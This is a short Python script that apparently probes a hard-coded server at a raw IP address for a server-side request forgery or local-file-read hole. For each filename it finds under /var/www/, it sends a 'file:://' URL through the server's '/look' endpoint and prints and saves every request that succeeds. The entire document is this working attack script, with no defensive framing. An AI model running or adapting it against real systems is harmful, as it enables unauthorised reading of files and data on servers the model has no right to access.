import os
import requests
import urllib.parse
dir='/var/www/'
url ='http://109.233.56.90:11501/look'
files = os.listdir(dir)
suitable=[]
for f in files:
   # encoded = urllib.urlencode('file:://'+dir+f)
    payload =  urllib.parse.urlencode({'url':'file:://'+dir+f})
    print('looking for '+ dir+f+'\n')
    res = requests.get(f'{url}?{payload}')
    if res.status_code==200:
        suitable.append(payload)
        print(res.text)
writefile= open('suitable', 'a')
for s in suitable:
    writefile.write(s)